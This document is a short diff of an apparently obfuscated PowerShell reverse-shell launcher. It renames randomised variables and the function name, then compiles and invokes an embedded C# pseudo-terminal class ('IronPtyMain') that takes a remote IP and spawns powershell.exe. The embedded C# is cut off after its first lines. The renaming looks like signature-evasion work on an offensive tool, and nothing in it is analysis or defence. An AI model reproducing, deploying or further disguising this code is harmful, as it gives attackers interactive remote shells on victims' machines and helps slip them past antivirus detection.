@@ -1,14 +1,14 @@
-function crummier
+function partying
 {   
     Param
     (
         [Parameter(Position = 0)]
         [String]
-        $HoUDTBIT99,
+        $ckVXqpSb99,
         
         [Parameter(Position = 1)]
         [String]
-        $FhNJOesm99,
+        $IOJbKqPe99,
         [Parameter()]
         [String]
         $Rows = "24",
@@ -17,16 +17,16 @@ function crummier
         $Cols = "80",
         [Parameter()]
         [String]
-        $gQbLrqsY99 = "powershell.exe",
+        $mKXnBkIZ99 = "powershell.exe",
         
         [Parameter()]
         [Switch]
-        $WYNqDOyu99
+        $eGkduGQO99
     )
     
     if( $PSBoundParameters.ContainsKey('Upgrade') ) {
-        $HoUDTBIT99 = "upgrade"
-        $FhNJOesm99 = "shell"
+        $ckVXqpSb99 = "upgrade"
+        $IOJbKqPe99 = "shell"
     }
     else{
   
@@ -34,16 +34,16 @@ function crummier
             throw "RemoteIp missing parameter"
         }
         
-        if(-Not($PSBoundParameters.ContainsKey('FhNJOesm99'))) {
-            throw "FhNJOesm99 missing parameter"
+        if(-Not($PSBoundParameters.ContainsKey('IOJbKqPe99'))) {
+            throw "IOJbKqPe99 missing parameter"
         }
     }
-    $tsbXMOpm99 = @($HoUDTBIT99, $FhNJOesm99, $Rows, $Cols, $gQbLrqsY99)
-    Add-Type -TypeDefinition $YGmyYvMm99 -Language CSharp;
-    $JMkliCrU99 = [IronPtyMainClass]::IronPtyMain($tsbXMOpm99)
-    Write-Output $JMkliCrU99
+    $KMQPfsoz99 = @($ckVXqpSb99, $IOJbKqPe99, $Rows, $Cols, $mKXnBkIZ99)
+    Add-Type -TypeDefinition $ulzjcxnJ99 -Language CSharp;
+    $UpilJtjW99 = [IronPtyMainClass]::IronPtyMain($KMQPfsoz99)
+    Write-Output $UpilJtjW99
 }
-$YGmyYvMm99 = @"
+$ulzjcxnJ99 = @"
 using System;
 using System.IO;
 using System.Text;
